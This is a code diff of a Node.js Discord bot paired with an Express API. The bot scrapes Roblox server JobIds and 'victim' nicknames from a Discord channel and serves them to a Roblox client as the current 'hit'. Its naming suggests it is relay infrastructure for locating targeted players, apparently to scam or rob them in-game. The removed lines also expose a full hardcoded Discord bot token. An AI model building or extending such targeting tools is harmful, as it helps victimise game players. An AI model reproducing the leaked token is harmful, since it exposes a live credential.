@@ -3,18 +3,17 @@ const { Client, GatewayIntentBits } = require('discord.js');
 const app = express();
 app.use(express.json());
 
-// 1. CONFIGURAÇÕES (Onde o bot vai olhar)
-const DISCORD_TOKEN = "MTUwNDExMzExMjkzOTQ5NTU0NQ.GewT_9.U2JOs7TkEfi7RZGOcwAs67GaDAEex4SmcSiJcg"; 
+// CONFIGURAÇÕES VIA VARIÁVEIS DE AMBIENTE (SEGURO)
+const DISCORD_TOKEN = process.env.DISCORD_TOKEN; 
 const CHANNEL_ID = "1502418752946573362"; 
 
-// Memória temporária para guardar o alvo
 let currentHit = {
     jobId: null,
     victimNick: null,
     placeId: 142823291
 };
 
-// 2. LÓGICA DO BOT (Ouvir o Discord)
+// --- LÓGICA DO BOT DO DISCORD ---
 const client = new Client({ 
     intents: [
         GatewayIntentBits.Guilds, 
@@ -24,37 +23,29 @@ const client = new Client({
 });
 
 client.on('messageCreate', async (message) => {
-    // Filtro: canal certo e ignora outros bots
+    // Filtra canal e ignora bots
     if (message.channel.id !== CHANNEL_ID || message.author.bot) return;
 
     const content = message.content;
-    
-    // Extrai o JobId e o Nick usando padrões (Regex)
     const jobIdMatch = content.match(/[a-f0-9-]{30,}/);
     const nickMatch = content.match(/(?:Victim|User|Nick):\s*(\w+)/i) || content.match(/(\w+)/);
 
     if (jobIdMatch) {
         currentHit.jobId = jobIdMatch[0];
-        currentHit.victimNick = (nickMatch && nickMatch[1]) ? nickMatch[1] : "Alvo";
+        currentHit.victimNick = (nickMatch && nickMatch[1]) ? nickMatch[1] : "Alvo_Detectado";
         console.log(`[PONTE] Novo alvo capturado: ${currentHit.victimNick}`);
     }
 });
 
-client.login(DISCORD_TOKEN);
+client.login(DISCORD_TOKEN).catch(err => console.error("Erro ao logar: Token inválido ou faltando!"));
 
-// 3. ROTAS DA API (Onde o Roblox vai perguntar)
-app.get('/api/next', (req, res) => {
-    res.json(currentHit);
-});
-
-// Rota para limpar o alvo se quiser
+// --- ROTAS DA API ---
+app.get('/', (req, res) => res.send("Ponte Online e Segura!"));
+app.get('/api/next', (req, res) => res.json(currentHit));
 app.get('/api/clear', (req, res) => {
     currentHit = { jobId: null, victimNick: null, placeId: 142823291 };
-    res.send("API Resetada");
+    res.send("Resetado.");
 });
 
-// 4. LIGAR O SERVIDOR
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Servidor rodando na porta ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Servidor na porta ${PORT}`));
